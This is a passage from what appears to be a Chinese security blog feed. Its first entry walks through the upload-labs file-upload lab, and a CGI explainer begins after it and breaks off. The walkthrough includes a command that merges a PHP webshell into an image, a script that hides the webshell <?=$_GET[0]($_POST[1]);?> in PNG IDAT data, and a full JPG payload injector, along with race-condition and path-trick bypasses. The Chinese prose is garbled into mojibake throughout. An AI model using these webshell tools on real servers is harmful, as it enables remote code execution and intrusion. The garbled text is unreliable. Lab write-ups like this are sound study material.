src="https://Lmg66.github.io/img/36.png" alt="å›¾ç‰‡"></p><p><img src="https://Lmg66.github.io/img/37.png" alt="å›¾ç‰‡"></p><h3 id="åäºŒ-å›¾ç‰‡æœ¨é©¬"><a href="#åäºŒ-å›¾ç‰‡æœ¨é©¬" class="headerlink" title="åäºŒ.å›¾ç‰‡æœ¨é©¬"></a>åäºŒ.å›¾ç‰‡æœ¨é©¬</h3><p>æŸ¥çœ‹æºç ï¼šé‡‡ç”¨ç™½åå•é™åˆ¶ä¸Šä¼ çš„åªèƒ½æ˜¯å›¾ç‰‡ï¼Œæ•…è€ƒè™‘å›¾ç‰‡æœ¨é©¬ã€‚</p><p><img src="https://Lmg66.github.io/img/38.png" alt="å›¾ç‰‡"></p><p>å›¾ç‰‡æœ¨é©¬çš„åˆ¶ä½œ:</p><pre><code>1. windowsä¸‹cmdå‘½å Copy 1.jpg/b+shell.php/a shell.jpg2.å³é”®å›¾ç‰‡é€‰æ‹©å±æ€§ï¼Œè¯¦ç»†ä¿¡æ¯ï¼Œç‰ˆæƒå¤„åŠ å…¥æœ¨é©¬ï¼Œå¦‚å›¾3.16è¿›åˆ¶æ–‡æœ¬ç¼–è¯‘å™¨</code></pre><p><img src="https://Lmg66.github.io/img/39.png" alt="å›¾ç‰‡"></p><p>ä¸Šä¼ å›¾ç‰‡æœ¨é©¬ï¼šä¸Šä¼ æˆåŠŸåé‡‡ç”¨æ–‡ä»¶åŒ…å«å³å¯</p><p><img src="https://Lmg66.github.io/img/40.png" alt="å›¾ç‰‡"></p><h3 id="åä¸‰-å›¾é©¬-getimagesize"><a href="#åä¸‰-å›¾é©¬-getimagesize" class="headerlink" title="åä¸‰.å›¾é©¬ getimagesize()"></a>åä¸‰.å›¾é©¬ getimagesize()</h3><p>æŸ¥çœ‹æºç ï¼š</p><p><img src="https://Lmg66.github.io/img/41.png" alt="å›¾ç‰‡"></p><p>getimagesize()å‡½æ•°ï¼š</p><pre><code>     ç”¨äºå–å¾—å›¾åƒå¤§å°ï¼Œå¦‚æœæŒ‡å®šçš„å›¾åƒæˆ–å…¶ä¸æ˜¯æœ‰æ•ˆçš„å›¾åƒï¼Œgetimagesize()å°†è¿”å›falseå¹¶äº§ç”Ÿä¸€æ¡E_WARNINGçº§çš„é”™è¯¯</code></pre><p>Image_type_to_extension()</p><pre><code>     ç”¨äºå–å¾—å›¾åƒç±»å‹çš„æ–‡ä»¶åç¼€</code></pre><p>ç»•è¿‡æ–¹æ³•: ä¸Šä¼ å›¾é©¬æœ¨é©¬å³å¯</p><h3 id="åå››-å›¾é©¬-exif-imagetype"><a href="#åå››-å›¾é©¬-exif-imagetype" class="headerlink" title="åå››.å›¾é©¬ exif_imagetype()"></a>åå››.å›¾é©¬ exif_imagetype()</h3><p>æŸ¥çœ‹æºç :</p><p><img src="https://Lmg66.github.io/img/58.png" alt="å›¾ç‰‡"></p><p>exif_imagetype()å‡½æ•°ï¼š</p><pre><code>ç”¨äºåˆ¤æ–­ä¸€ä¸ªå›¾åƒçš„ç±»å‹ï¼Œæ­£å¸¸åˆ™è¿”å›ç­¾åå¯¹åº”å¸¸é‡ï¼Œå¦åˆ™è¿”å›false</code></pre><p>ç»•è¿‡æ–¹æ³•ï¼šä¸Šä¼ å›¾ç‰‡æœ¨é©¬å³å¯</p><h3 id="åäº”-å›¾é©¬-äºŒæ¬¡æ¸²æŸ“"><a href="#åäº”-å›¾é©¬-äºŒæ¬¡æ¸²æŸ“" class="headerlink" title="åäº”.å›¾é©¬ äºŒæ¬¡æ¸²æŸ“"></a>åäº”.å›¾é©¬ äºŒæ¬¡æ¸²æŸ“</h3><h4 id="æŸ¥çœ‹æºç -å¯¹gifçš„è¿‡æ»¤éƒ¨åˆ†ï¼šå‘ç°gifå›¾ç‰‡è¢«äºŒæ¬¡æ¸²æŸ“"><a href="#æŸ¥çœ‹æºç -å¯¹gifçš„è¿‡æ»¤éƒ¨åˆ†ï¼šå‘ç°gifå›¾ç‰‡è¢«äºŒæ¬¡æ¸²æŸ“" class="headerlink" title="æŸ¥çœ‹æºç  å¯¹gifçš„è¿‡æ»¤éƒ¨åˆ†ï¼šå‘ç°gifå›¾ç‰‡è¢«äºŒæ¬¡æ¸²æŸ“"></a>æŸ¥çœ‹æºç  å¯¹gifçš„è¿‡æ»¤éƒ¨åˆ†ï¼šå‘ç°gifå›¾ç‰‡è¢«äºŒæ¬¡æ¸²æŸ“</h4><p><img src="https://Lmg66.github.io/img/42.png" alt="å›¾ç‰‡"></p><p>å°è¯•ä¸Šä¼ gif(å¸¦æœ‰æœ¨é©¬)ï¼Œå¹¶å°†ä¸Šä¼ </p><p><img src="https://Lmg66.github.io/img/43.png" alt="å›¾ç‰‡"></p><p><img src="https://Lmg66.github.io/img/44.png" alt="å›¾ç‰‡"></p><p>gifç»•è¿‡:æ‰¾åˆ°æ¸²æŸ“å‰åæ²¡æœ‰å˜åŒ–çš„ä½ç½®ï¼Œç„¶åå°†phpæœ¨é©¬å†™å…¥å³å¯ï¼Œä¸‹è½½ä¸Šä¼ åçš„gifï¼Œå‘ç°æœ¨é©¬ä¸Šä¼ æˆåŠŸ</p><p><img src="https://Lmg66.github.io/img/45.png" alt="å›¾ç‰‡"></p><p><img src="https://Lmg66.github.io/img/46.png" alt="å›¾ç‰‡"></p><h4 id="æŸ¥çœ‹æºç ï¼šå¯¹pngçš„è¿‡æ»¤éƒ¨åˆ†-å‘ç°è¢«äºŒæ¬¡æ¸²æŸ“"><a href="#æŸ¥çœ‹æºç ï¼šå¯¹pngçš„è¿‡æ»¤éƒ¨åˆ†-å‘ç°è¢«äºŒæ¬¡æ¸²æŸ“" class="headerlink" title="æŸ¥çœ‹æºç ï¼šå¯¹pngçš„è¿‡æ»¤éƒ¨åˆ† å‘ç°è¢«äºŒæ¬¡æ¸²æŸ“"></a>æŸ¥çœ‹æºç ï¼šå¯¹pngçš„è¿‡æ»¤éƒ¨åˆ† å‘ç°è¢«äºŒæ¬¡æ¸²æŸ“</h4><p><img src="https://Lmg66.github.io/img/47.png" alt="å›¾ç‰‡"></p><p>å°è¯•ä¸Šä¼ å¸¦æœ‰ä¸€å¥è¯æœ¨é©¬çš„pngå›¾ç‰‡ï¼Œä¸Šä¼ ä¸‹è½½å‘ç°æœ¨é©¬è¢«æ¸²æŸ“æ‰</p><p><img src="https://Lmg66.github.io/img/48.png" alt="å›¾ç‰‡"></p><p><img src="https://Lmg66.github.io/img/49.png" alt="å›¾ç‰‡"></p><p>ç»•è¿‡æ–¹æ³•ï¼š</p><p>1.å†™å…¥phpä»£ç åˆ°PLTEæ¨¡å—</p><p>PLTEæ¨¡å—:è°ƒè‰²æ¿PLTEæ•°æ®å—æ˜¯è¾…åŠ©æ•°æ®å¿«ï¼Œå¯¹äºç´¢å¼•å›¾åƒï¼Œè°ƒè¯•æ¿ä¿¡æ¯æ˜¯å¿…é¡»çš„ï¼Œè°ƒè‰²æ¿çš„é¢œè‰²ç´¢å¼•ä»0å¼€å§‹ç¼–å·ï¼Œç„¶åæ˜¯1ã€2â€¦â€¦ï¼Œè°ƒè‰²æ¿çš„é¢œè‰²æ•°ä¸èƒ½è¶…è¿‡è‰²æ·±ä¸­è§„å®šçš„é¢œè‰²æ•°ï¼ˆå¦‚å›¾åƒè‰²æ·±ä¸º4çš„æ—¶å€™ï¼Œè°ƒè‰²æ¿ä¸­çš„é¢œè‰²æ•°ä¸å¯ä»¥è¶…è¿‡2^4=16ï¼‰ï¼Œå¦åˆ™ï¼Œè¿™å°†å¯¼è‡´PNGå›¾åƒä¸åˆæ³•ã€‚</p><p>PLTEæ¨¡å—æ˜¯è¾…åŠ©æ¨¡å—å¹¶ä¸æ˜¯æ¯ä¸ªpngå›¾ç‰‡éƒ½æœ‰çš„ï¼Œå¤šæ‰¾å‡ ä¸ªpngå›¾ç‰‡</p><p><img src="https://Lmg66.github.io/img/50.png" alt="å›¾ç‰‡"></p><p>ç„¶åè®¡ç®—PLTEæ•°æ®å—çš„CRC</p><pre><code>import binasciiimport repng = open(r&#39;2.png&#39;,&#39;rb&#39;)a = png.read()png.close()hexstr = binascii.b2a_hex(a)&#39;&#39;&#39; PLTE crc &#39;&#39;&#39;data =  &#39;504c5445&#39;+ re.findall(&#39;504c5445(.*?)49444154&#39;,hexstr)[0]crc = binascii.crc32(data[:-16].decode(&#39;hex&#39;)) &amp; 0xffffffffprint hex(crc)</code></pre><p>è¿è¡Œç»“æœå†™å…¥CRCæ¨¡å—</p><p><img src="https://Lmg66.github.io/img/51.png" alt="å›¾ç‰‡"></p><p>ç„¶åä¸Šä¼ å³å¯ï¼›æ³¨ï¼šCRC(cyclic redundancy check)åŸŸä¸­çš„å€¼æ˜¯å¯¹Chunk Type CodeåŸŸå’ŒChunk DataåŸŸä¸­çš„æ•°æ®è¿›è¡Œè®¡ç®—å¾—åˆ°çš„ã€‚å‚¨å­˜ç”¨æ¥æ£€æµ‹æ˜¯å¦æœ‰é”™è¯¯çš„å¾ªç¯å†—ä½™ç ã€‚å‚è€ƒ<a href="https://xz.aliyun.com/t/2657" target="_blank" rel="noopener">https://xz.aliyun.com/t/2657</a></p><p>2.å†™å…¥IDATæ•°æ®å—</p><p>å›½å¤–å¤§ä½¬è„šæœ¬ç›´æ¥ç”¨</p><pre><code>&lt;?php$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,           0x66, 0x44, 0x50, 0x33);$img = imagecreatetruecolor(32, 32);for ($y = 0; $y &lt; sizeof($p); $y += 3) {   $r = $p[$y];   $g = $p[$y+1];   $b = $p[$y+2];   $color = imagecolorallocate($img, $r, $g, $b);   imagesetpixel($img, round($y / 3), 0, $color);}imagepng($img,&#39;./1.png&#39;);?&gt;</code></pre><p>è¿è¡Œè„šæœ¬ç”Ÿæˆ1.pngï¼Œå‘ç°æœ¨é©¬<?=$_GET[0]($_POST[1]);?>è¢«å†™å…¥</p><p><img src="https://Lmg66.github.io/img/52.png" alt="å›¾ç‰‡"></p><p>ä¸Šä¼ åˆ©ç”¨ï¼šæ–‡ä»¶åŒ…å«</p><p><img src="https://Lmg66.github.io/img/53.png" alt="å›¾ç‰‡"></p><p>å›¾ç‰‡åŸç†ï¼š<a href="https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/" target="_blank" rel="noopener">https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</a></p><p>æœ¨é©¬åŸç†ï¼šassert()ä¼šæ£€æŸ¥å†…éƒ¨æ˜¯å¦æ˜¯å­—ç¬¦ä¸²ï¼Œå¦‚æœæ˜¯å­—ç¬¦ä¸²ï¼Œå®ƒå°†ä¼šè¢«assert()å½“åšphpä»£ç æ‰§è¡Œ</p><h4 id="æŸ¥çœ‹æºç -å¯¹jpgçš„è¿‡æ»¤éƒ¨åˆ†-å‘ç°å¯¹jpgå›¾ç‰‡è¿›è¡ŒäºŒæ¬¡æ¸²æŸ“"><a href="#æŸ¥çœ‹æºç -å¯¹jpgçš„è¿‡æ»¤éƒ¨åˆ†-å‘ç°å¯¹jpgå›¾ç‰‡è¿›è¡ŒäºŒæ¬¡æ¸²æŸ“" class="headerlink" title="æŸ¥çœ‹æºç  å¯¹jpgçš„è¿‡æ»¤éƒ¨åˆ† å‘ç°å¯¹jpgå›¾ç‰‡è¿›è¡ŒäºŒæ¬¡æ¸²æŸ“"></a>æŸ¥çœ‹æºç  å¯¹jpgçš„è¿‡æ»¤éƒ¨åˆ† å‘ç°å¯¹jpgå›¾ç‰‡è¿›è¡ŒäºŒæ¬¡æ¸²æŸ“</h4><p><img src="https://Lmg66.github.io/img/54.png" alt="å›¾ç‰‡"></p><p>ç»•è¿‡å§¿åŠ¿:å…ˆéšä¾¿ä¸Šä¼ ä¸€ä¸ª1.jpgå›¾ç‰‡åˆ°æœåŠ¡å™¨ï¼Œå°†ä¸Šä¼ åçš„å›¾ç‰‡ä¸‹è½½ï¼Œç”¨å›½å¤–å¤§ä½¬è„šæœ¬å¤„ç†ä¸€ä¸‹ï¼ˆå¹¶ä¸æ˜¯æ‰€æœ‰å›¾ç‰‡éƒ½èƒ½è¢«è„šæœ¬å¤„ç†æ’å…¥æœ¨é©¬å¤šè¯•å‡ ä¸ªï¼‰</p><p>å¤„ç†cmdå‘½ä»¤ï¼šphp è„šæœ¬å.php 1.jpgï¼ˆéœ€è¦å®‰è£…phpç¯å¢ƒï¼‰</p><p>è„šæœ¬è¢«æˆ‘æ”¹ä¸€ä¸‹ï¼Œå‘ç°å¤§ä½¬è„šæœ¬ä¸èƒ½ç”¨</p><pre><code>&lt;?php    /*    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().    It is necessary that the size and quality of the initial image are the same as those of the processed image.    1) Upload an arbitrary image via secured files upload script    2) Save the processed image and launch:    jpg_payload.php &lt;jpg_name.jpg&gt;    In case of successful injection you will get a specially crafted image, which should be uploaded again.    Since the most straightforward injection method is used, the following problems can occur:    1) After the second processing the injected data may become partially corrupted.    2) The jpg_payload.php script outputs &quot;Something&#39;s wrong&quot;.    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.    Sergey Bobrov @Black2Fan.    See also:    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/    */    $miniPayload = &quot;&lt;?php phpinfo();?&gt;&quot;;    if(!extension_loaded(&#39;gd&#39;) || !function_exists(&#39;imagecreatefromjpeg&#39;)) {        die(&#39;php-gd is not installed&#39;);    }    if(!isset($argv[1])) {        die(&#39;php jpg_payload.php &lt;jpg_name.jpg&gt;&#39;);    }    set_error_handler(&quot;custom_error_handler&quot;);    for($pad = 0; $pad &lt; 1024; $pad++) {        $nullbytePayloadSize = $pad;        $dis = new DataInputStream($argv[1]);        $outStream = file_get_contents($argv[1]);        $extraBytes = 0;        $correctImage = TRUE;        if($dis-&gt;readShort() != 0xFFD8) {            die(&#39;Incorrect SOI marker&#39;);        }        while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) {            $marker = $dis-&gt;readByte();            $size = $dis-&gt;readShort() - 2;            $dis-&gt;skip($size);            if($marker === 0xDA) {                $startPos = $dis-&gt;seek();                $outStreamTmp =                     substr($outStream, 0, $startPos) .                     $miniPayload .                     str_repeat(&quot;\0&quot;,$nullbytePayloadSize) .                     substr($outStream, $startPos);                checkImage(&#39;_&#39;.$argv[1], $outStreamTmp, TRUE);                if($extraBytes !== 0) {                    while((!$dis-&gt;eof())) {                        if($dis-&gt;readByte() === 0xFF) {                            if($dis-&gt;readByte !== 0x00) {                                break;                            }                        }                    }                    $stopPos = $dis-&gt;seek() - 2;                    $imageStreamSize = $stopPos - $startPos;                    $outStream =                         substr($outStream, 0, $startPos) .                         $miniPayload .                         substr(                            str_repeat(&quot;\0&quot;,$nullbytePayloadSize).                                substr($outStream, $startPos, $imageStreamSize),                            0,                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) .                                 substr($outStream, $stopPos);                } elseif($correctImage) {                    $outStream = $outStreamTmp;                } else {                    break;                }                if(checkImage(&#39;payload_&#39;.$argv[1], $outStream)) {                    die(&#39;Success!&#39;);                } else {                    break;                }            }        }    }    unlink(&#39;payload_&#39;.$argv[1]);    die(&#39;Something\&#39;s wrong&#39;);    function checkImage($filename, $data, $unlink = FALSE) {        global $correctImage;        file_put_contents($filename, $data);        $correctImage = TRUE;        imagecreatefromjpeg($filename);        if($unlink)            unlink($filename);        return $correctImage;    }    function custom_error_handler($errno, $errstr, $errfile, $errline) {        global $extraBytes, $correctImage;        $correctImage = FALSE;        if(preg_match(&#39;/(\d+) extraneous bytes before marker/&#39;, $errstr, $m)) {            if(isset($m[1])) {                $extraBytes = (int)$m[1];            }        }    }    class DataInputStream {        private $binData;        private $order;        private $size;        public function __construct($filename, $order = false, $fromString = false) {            $this-&gt;binData = &#39;&#39;;            $this-&gt;order = $order;            if(!$fromString) {                if(!file_exists($filename) || !is_file($filename))                    die(&#39;File not exists [&#39;.$filename.&#39;]&#39;);                $this-&gt;binData = file_get_contents($filename);            } else {                $this-&gt;binData = $filename;            }            $this-&gt;size = strlen($this-&gt;binData);        }        public function seek() {            return ($this-&gt;size - strlen($this-&gt;binData));        }        public function skip($skip) {            $this-&gt;binData = substr($this-&gt;binData, $skip);        }        public function readByte() {            if($this-&gt;eof()) {                die(&#39;End Of File&#39;);            }            $byte = substr($this-&gt;binData, 0, 1);            $this-&gt;binData = substr($this-&gt;binData, 1);            return ord($byte);        }        public function readShort() {            if(strlen($this-&gt;binData) &lt; 2) {                die(&#39;End Of File&#39;);            }            $short = substr($this-&gt;binData, 0, 2);            $this-&gt;binData = substr($this-&gt;binData, 2);            if($this-&gt;order) {                $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]);            } else {                $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]);            }            return $short;        }        public function eof() {            return !$this-&gt;binData||(strlen($this-&gt;binData) === 0);        }    }?&gt;</code></pre><p><img src="https://Lmg66.github.io/img/55.png" alt="å›¾ç‰‡"></p><p><img src="https://Lmg66.github.io/img/56.png" alt="å›¾ç‰‡"></p><p><img src="https://Lmg66.github.io/img/57.png" alt="å›¾ç‰‡"></p><h3 id="åå…­-æ¡ä»¶ç«äº‰"><a href="#åå…­-æ¡ä»¶ç«äº‰" class="headerlink" title="åå…­.æ¡ä»¶ç«äº‰"></a>åå…­.æ¡ä»¶ç«äº‰</h3><p>æŸ¥çœ‹æºç ï¼šå‘ç°ä¸Šä¼ çš„æ–‡ä»¶å…ˆè¢«å­˜å‚¨åœ¨æœåŠ¡å™¨ï¼Œç„¶åè¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœä¸æ˜¯jpg png gif åˆ™unlik()åˆ æ‰ï¼Œæ˜¯çš„è¯é‡å‘½å</p><p><img src="https://Lmg66.github.io/img/59.png" alt="å›¾ç‰‡"></p><p>ç»•è¿‡å§¿åŠ¿ï¼šåœ¨åˆ¤æ–­åˆ é™¤å‰ï¼Œè¿›è¡Œè®¿é—®ï¼Œç«äº‰æ—¶é—´<br> shell.php å¦‚ä¸‹ï¼Œå½“ç„¶ä¹Ÿå¯å†™å…¶ä»–æœ¨é©¬æˆ–è€…ç”Ÿæˆæœ¨é©¬çš„phpæ–‡ä»¶ï¼Œä¸Šä¼ ç”¨burpsuiteæŠ“åŒ…ï¼Œå½“ç„¶å¯ä»¥å†™è„šæœ¬</p><p><img src="https://Lmg66.github.io/img/60.png" alt="å›¾ç‰‡"></p><p><img src="https://Lmg66.github.io/img/61.png" alt="å›¾ç‰‡"></p><p><img src="https://Lmg66.github.io/img/62.png" alt="å›¾ç‰‡"></p><p>ç»•åæ„é€ è®¿é—®è¿æ¥ï¼š<a href="http://127.0.0.1/upload-labs-master/upload/shell.php" target="_blank" rel="noopener">http://127.0.0.1/upload-labs-master/upload/shell.php</a>   ç”¨burpsuiteæŠ“åŒ…å‘é€å’Œä¸Šä¼ ä¸€èµ·å¼€å§‹  å¦‚ä½•ä¸è¡Œå¯ä»¥å°è¯•çº¿ç¨‹è°ƒå¤§ç‚¹ï¼Œæˆ–è€…å†™è„šæœ¬</p><p><img src="https://Lmg66.github.io/img/63.png" alt="å›¾ç‰‡"></p><p>ç±»ä¼¼çš„ä¹Ÿæ˜¯å…ˆä¿å­˜å†é‡å‘½ååŒæ ·å¯ä»¥ç«äº‰ æºç </p><p><img src="https://Lmg66.github.io/img/64.png" alt="å›¾ç‰‡"></p><h3 id="åä¸ƒ-ç»•è¿‡"><a href="#åä¸ƒ-ç»•è¿‡" class="headerlink" title="åä¸ƒ../ç»•è¿‡"></a>åä¸ƒ../ç»•è¿‡</h3><p>æŸ¥çœ‹æºç ï¼š</p><p><img src="https://Lmg66.github.io/img/65.png" alt="å›¾ç‰‡"></p><p>ç»•è¿‡å§¿åŠ¿ï¼š<br>Pathinfo()ä¼šè¿”å›ä¸€ä¸ªå…³è”æ•°ç»„å«æœ‰pathçš„ä¿¡æ¯ã€‚ä¾‹å¦‚ï¼š</p><p><img src="https://Lmg66.github.io/img/66.png" alt="å›¾ç‰‡"></p><p>save_name=1.php/.è¿™æ ·file_extå€¼ä¸ºç©ºç»•è¿‡é»‘åå•ï¼Œè€Œmove_uploaded_fileå‡½æ•°å¿½ç•¥æ–‡ä»¶åçš„./å°±å¯ä»¥å®ç°ä¿å­˜æ–‡ä»¶ä¸ºshell.php</p><p><img src="https://Lmg66.github.io/img/67.png" alt="å›¾ç‰‡"></p><p>æ³¨ï¼šç½‘ä¸Šçœ‹æœ‰ç”¨ save_name=1.php%00ç»•è¿‡çš„ï¼Œè™½ç„¶èƒ½ä¸Šä¼ æˆåŠŸä½†æ˜¯ä¿å­˜çš„æ–‡ä»¶åæ˜¯1.php%00ä½ æ˜¯æ²¡æ³•åˆ©ç”¨çš„ï¼Œçœ‹çœ‹åŸå› å¥½åƒæ˜¯move_uploaded_fileå‡½æ•°æŠŠsave_nameå½“åšå­—ç¬¦ä¸²æ¥ç”¨çš„ï¼ˆç›®å‰æ„Ÿè§‰è¿™ä¸ªæ–¹æ³•ä¸è¡Œï¼Œå¯èƒ½æ“ä½œæœ‰è¯¯ï¼‰</p><h3 id="åå…«-æ•°ç»„-ç»•è¿‡"><a href="#åå…«-æ•°ç»„-ç»•è¿‡" class="headerlink" title="åå…«.æ•°ç»„+./ç»•è¿‡"></a>åå…«.æ•°ç»„+./ç»•è¿‡</h3><p>æŸ¥çœ‹æºç ï¼šåˆ†æå¦‚å›¾</p><p><img src="https://Lmg66.github.io/img/68.png" alt="å›¾ç‰‡"></p><p>ç»•è¿‡å§¿åŠ¿ï¼š</p><p><img src="https://Lmg66.github.io/img/69.png" alt="å›¾ç‰‡"></p><p><img src="https://Lmg66.github.io/img/70.png" alt="å›¾ç‰‡"></p>]]></content>
      
      
      <categories>
          
          <category> webå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ–‡ä»¶ä¸Šä¼  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ–‡ä»¶åŒ…å«è¡¥å……CGIæŠ€æœ¯åŸç†</title>
      <link href="/posts/832d.html"/>
      <url>/posts/832d.html</url>
      
        <content type="html"><![CDATA[<h3 id="CGIæŠ€æœ¯åŸç†"><a href="#CGIæŠ€æœ¯åŸç†" class="headerlink" title="CGIæŠ€æœ¯åŸç†"></a>CGIæŠ€æœ¯åŸç†</h3><h4 id="1-1-CGIçš„æå‡º"><a href="#1-1-CGIçš„æå‡º" class="headerlink" title="1.1 CGIçš„æå‡º"></a>1.1 CGIçš„æå‡º</h4><p>CGIæ˜¯å¤–éƒ¨æ‰©å±•åº”ç”¨ç¨‹åºä¸WWWæœåŠ¡å™¨äº¤äº’çš„ä¸€ä¸ªæ ‡å‡†æ¥å£ã€‚æŒ‰ç…§CGIæ ‡å‡†ç¼–å†™çš„å¤–éƒ¨æ‰©å±•åº”ç”¨ç¨‹åºå¯ä»¥å¤„ç†å®¢æˆ·ç«¯ï¼ˆä¸€èˆ¬æ˜¯WWWæµè§ˆå™¨ï¼‰è¾“å…¥çš„ååŒå·¥ä½œæ•°æ®ï¼Œå®Œæˆå®¢æˆ·ç«¯ä¸æœåŠ¡å™¨çš„äº¤äº’æ“ä½œã€‚è¿™åœ¨å®é™…åº”ç”¨ä¸­éå¸¸æœ‰ç”¨ï¼Œå¦‚å¯ä»¥ç¼–å†™CGIå¤–éƒ¨æ‰©å±•ç¨‹åºæ¥è®¿é—®å¤–éƒ¨æ•°æ®åº“ï¼Œå®¢æˆ·ç«¯ç”¨æˆ·å¯ä»¥é€šè¿‡å®ƒå’ŒWWWæœåŠ¡å™¨æ¥è¿›è¡Œæ•°æ®æŸ¥è¯¢ã€‚CGIä¸€èˆ¬åˆ†ä¸¤ç§ï¼šæ ‡å‡†CGIå’Œç¼“å†²CGIã€‚æ‰€æœ‰çš„WWWæœåŠ¡å™¨å‡åº”æ”¯æŒæ ‡å‡†CGIï¼ŒæŒ‰æ ‡å‡†CGIç¼–å†™çš„ç¨‹åºä¸å…·ä½“çš„WWWæœåŠ¡å™¨æ— å…³ã€‚è€ŒæŒ‰ç¼“å†²CGIç¼–å†™çš„ç¨‹åºä¸WWWæœåŠ¡å™¨æœ‰å…³ã€‚</p><h3 id="1-2-CGIçš„å·¥ä½œåŸç†"><a href="#1-2-CGIçš„å·¥ä½œåŸç†" class="headerlink" title="1.2 CGIçš„å·¥ä½œåŸç†"></a>1.2 CGIçš„å·¥ä½œåŸç†</h3><h4 id="1ï¼æ ‡å‡†CGI"><a href="#1ï¼æ ‡å‡†CGI" class="headerlink" title="1ï¼æ ‡å‡†CGI"></a>1ï¼æ ‡å‡†CGI</h4><p>å®¢æˆ·ç«¯ã€æœåŠ¡å™¨ã€CGIæ¥å£ä¸å¤–éƒ¨ç¨‹åºé—´çš„å…³ç³»å¯ç”¨å›¾1ï¼1è¡¨ç¤ºï¼ˆç¼–æ’è€…ï¼šå›¾ç•¥ï¼‰ï¼šå¦‚ä¸Šå›¾æ‰€ç¤ºï¼ŒæœåŠ¡å™¨æ˜¯å®¢æˆ·ç«¯ï¼ˆå¦‚æµè§ˆå™¨ï¼‰ä¸æ‰©å±•ç¨‹åºä¹‹é—´çš„é€šé“ã€‚å½“å®¢æˆ·ç«¯çš„ç”¨æˆ·å®Œæˆäº†ä¸€å®šè¾“å…¥å·¥ä½œï¼ˆæ¯”å¦‚å¡«å……å®ŒHTMLæ–‡æ¡£ä¸­çš„FORMè¡¨ï¼‰ä¹‹åå‘æœåŠ¡å™¨å‘å‡ºHTTPè¯·æ±‚ï¼ˆç§°ä¸ºCGIè¯·æ±‚ï¼‰ï¼ŒæœåŠ¡å™¨å®ˆæŠ¤è¿›ç¨‹æ¥æ”¶åˆ°è¯¥è¯·æ±‚åï¼Œå°±åˆ›å»ºä¸€ä¸ªå­è¿›ç¨‹ï¼ˆç§°ä¸ºCGIè¿›ç¨‹ï¼‰ã€‚è¯¥CGIå­è¿›ç¨‹å°†CGIè¯·æ±‚çš„æœ‰å…³æ•°æ®è®¾ç½®æˆç¯å¢ƒå˜é‡ï¼Œåœ¨å¤–éƒ¨CGIç¨‹åºä¸æœåŠ¡å™¨é—´å»ºç«‹ä¸¤æ¡æ•°æ®é€šé“ï¼ˆæ ‡å‡†Iï¼Oï¼‰ï¼Œç„¶åå¯åŠ¨URLæŒ‡å®šçš„CGIç¨‹åºï¼Œå¹¶ä¸è¯¥å­è¿›ç¨‹ä¿æŒåŒæ­¥ï¼Œä»¥ç›‘æµ‹CGIç¨‹åºçš„æ‰§è¡ŒçŠ¶æ€ã€‚å­è¿›ç¨‹é€šè¿‡æ ‡å‡†è¾“å‡ºæµå°†å¤„ç†ç»“æœä¼ é€’ç»™æœåŠ¡å™¨å®ˆæŠ¤è¿›ç¨‹ï¼Œå®ˆæŠ¤è¿›ç¨‹å†å°†å¤„ç†ç»“æœä½œä¸ºåº”ç­”æ¶ˆæ¯å›é€åˆ°å®¢æˆ·ç«¯ã€‚å¤–éƒ¨CGIç¨‹åºé€šè¿‡ç¯å¢ƒå˜é‡ã€å‘½ä»¤è¡Œå‚æ•°ã€æ ‡å‡†è¾“å…¥è¾“å‡ºä¸WWWæœåŠ¡å™¨è¿›è¡Œé€šè®¯ï¼Œä¼ é€’æœ‰å…³å‚æ•°å’Œå¤„ç†ç»“æœã€‚<br>ï¼Šç¯å¢ƒå˜é‡ï¼šå½“æœåŠ¡å™¨å®ˆæŠ¤è¿›ç¨‹åˆ›å»ºå­è¿›ç¨‹è¿è¡ŒCGIç¨‹åºæ—¶ï¼Œè®¾ç½®ç›¸åº”çš„ç¯å¢ƒå˜é‡å’Œå‘½ä»¤è¡Œå‚æ•°ï¼Œä»¥ä¼ é€’å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨çš„æœ‰å…³ä¿¡æ¯ç»™è¯¥å­è¿›ç¨‹ã€‚<br>ï¼Šå‘½ä»¤è¡Œå‚æ•°ï¼šå‘½ä»¤è¡Œå‚æ•°ä»…åœ¨æœ‰HTMLæ–‡æ¡£ä¸­æœ‰SINDEXæŸ¥è¯¢çš„æƒ…å†µä¸‹ä½¿ç”¨ã€‚<br>ï¼Šæ ‡å‡†è¾“å…¥è¾“å‡ºï¼šå½“HTTPè¯·æ±‚æ¨¡å¼é‡‡ç”¨POSTæ–¹å¼æ—¶ï¼ŒCGIç¨‹åºé€šè¿‡æ ‡å‡†è¾“å…¥æµå’Œæœ‰å…³ç¯å¢ƒå˜é‡æ¥è·å–å®¢æˆ·ç«¯ä¼ è¾“æ•°æ®ï¼›å¦‚é‡‡ç”¨GETæ–¹å¼æ—¶ï¼ŒCGIç¨‹åºç›´æ¥é€šè¿‡ç¯å¢ƒå˜é‡è·å–å®¢æˆ·ç«¯ä¼ è¾“æ•°æ®ã€‚å½“CGIç¨‹åºè¦è¿”å›å¤„ç†ç»“æœï¼ˆä¸€èˆ¬ä¸ºHTMLæ–‡æ¡£ï¼‰ç»™å®¢æˆ·ç«¯æ—¶ï¼Œå®ƒé€šè¿‡æ 